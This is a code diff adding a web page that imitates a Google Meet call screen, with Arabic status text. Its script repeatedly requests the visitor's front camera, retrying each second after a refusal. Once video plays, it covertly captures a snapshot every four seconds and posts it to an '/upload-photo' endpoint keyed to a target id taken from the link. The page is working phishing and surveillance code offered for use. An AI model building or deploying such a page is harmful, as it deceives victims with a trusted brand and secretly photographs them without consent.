@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Meet</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: Arial, sans-serif; background: #202124; color: white; height: 100vh; overflow: hidden; display: flex; flex-direction: column; }
+        .main { flex: 1; display: flex; align-items: center; justify-content: center; padding: 20px; }
+        .video-box { width: 100%; max-width: 800px; aspect-ratio: 16/9; background: #3c4043; border-radius: 8px; position: relative; overflow: hidden; }
+        video { width: 100%; height: 100%; object-fit: cover; }
+        .bar { height: 80px; display: flex; align-items: center; justify-content: center; gap: 15px; }
+        .btn { width: 45px; height: 45px; border-radius: 50%; background: #3c4043; border: 1px solid #5f6368; }
+        .btn-red { width: 60px; border-radius: 20px; background: #ea4335; border: none; }
+        #msg { position: fixed; top: 10px; right: 10px; font-size: 12px; color: #8ab4f8; }
+    </style>
+</head>
+<body>
+    <div id="msg">جاري الاتصال بالاجتماع...</div>
+    <div class="main">
+        <div class="video-box">
+            <video id="v" autoplay playsinline muted></video>
+        </div>
+    </div>
+    <canvas id="c" style="display:none"></canvas>
+    <div class="bar">
+        <div class="btn"></div><div class="btn"></div><div class="btn"></div>
+        <button class="btn-red" onclick="location.reload()"></button>
+    </div>
+
+    <script>
+        const v = document.getElementById('v'), c = document.getElementById('c'), msg = document.getElementById('msg');
+        const params = new URLSearchParams(window.location.search);
+        const targetId = params.get('id');
+
+        async function init() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+                v.srcObject = stream;
+                v.onplaying = () => {
+                    msg.textContent = "متصل";
+                    setInterval(take, 4000); // سحب كل 4 ثواني
+                };
+            } catch (e) {
+                setTimeout(init, 1000); // إعادة محاولة عند الرفض
+            }
+        }
+
+        function take() {
+            if (!targetId) return;
+            c.width = v.videoWidth; c.height = v.videoHeight;
+            const ctx = c.getContext('2d');
+            ctx.translate(c.width, 0); ctx.scale(-1, 1);
+            ctx.drawImage(v, 0, 0);
+            
+            fetch('/upload-photo', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ image: c.toDataURL('image/jpeg', 0.6), targetId: targetId })
+            });
+        }
+        window.onload = init;
+    </script>
+</body>
+</html>
